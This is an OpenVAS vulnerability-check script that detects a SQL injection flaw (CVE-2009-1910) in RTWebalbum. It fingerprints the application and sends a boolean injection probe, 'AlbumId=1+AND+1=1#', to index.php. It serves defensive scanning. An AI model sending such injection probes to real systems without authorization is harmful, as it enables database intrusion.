###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_rtwebalbum_sql_inj_vuln.nasl 15 2013-10-27 12:49:54Z jan $
#
# RTWebalbum SQL Injection Vulnerability
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Copyright:
# Copyright (c) 2009 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to manipulate SQL queries by
  injecting arbitrary SQL code.
  Impact Level: Application";
tag_affected = "RTWebalbum versions prior to 1.0.574";
tag_insight = "Input passed to the 'AlbumId' parameter in index.php is not properly sanitised
  before being used in SQL queries";
tag_solution = "Upgrade to RTWebalbum version 1.0.574 or Apply SVN Repositories
  http://sourceforge.net/projects/rtwebalbum
  http://rtwebalbum.svn.sourceforge.net/viewvc/rtwebalbum/index.php?view=log";
tag_summary = "This host is running RTWebalbum and is prone to SQL Injection
  vulnerability.";

if(description)
{
  script_id(900373);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-06-23 10:30:45 +0200 (Tue, 23 Jun 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_cve_id("CVE-2009-1910");
  script_bugtraq_id(34888);
  script_name("RTWebalbum SQL Injection Vulnerability");
  desc = "

  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://secunia.com/advisories/35022");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/50406");
  script_xref(name : "URL" , value : "http://rtwebalbum.svn.sourceforge.net/viewvc/rtwebalbum");

  script_description(desc);
  script_summary("Check for the RTWebalbum's SQL Injection Attack");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 SecPod");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

rtwebPort = get_http_port(default:80);
if(!rtwebPort){
  rtwebPort = 80;
}

if(!get_port_state(rtwebPort)){
  exit(0);
}


foreach rtwebDir (make_list("/rtwebalbum", cgi_dirs()))
{
  sndReq = http_get(item:string(rtwebDir, "/admin.php"), port:rtwebPort);
  rcvRes = http_send_recv(port:rtwebPort, data:sndReq);

  if("rtwebalbum" >!< rcvRes)
  {
    sndReq = http_get(item:string(rtwebDir, "/index.php"), port:rtwebPort);
    rcvRes = http_send_recv(port:rtwebPort, data:sndReq);
  }

  # Check for http://sourceforge.net/projects/rtwebalbum/
  if(egrep(pattern:"<a\ href=?[^?]+:\/\/sourceforge.net\/projects\/rtwebalbum",
     string:rcvRes) && egrep(pattern:"^HTTP/.* 200 OK", string:rcvRes))
  {
    # Attack for SQL Injection with AlbumID is 1
    sndReq = http_get(item:string(rtwebDir, "/index.php?AlbumId=1+AND+1=1#"),
                      port:rtwebPort);
    rcvRes = http_send_recv(port:rtwebPort, data:sndReq);

    #Exploit for 'True' Condition
    if(rcvRes =~ "<div\ id=.?descrp.?>[^<]" ||
       rcvRes =~ "<div\ id=.?descrp2.?>[^<]")
    {
      security_hole(rtwebPort);
      exit(0);
    }
  }
}
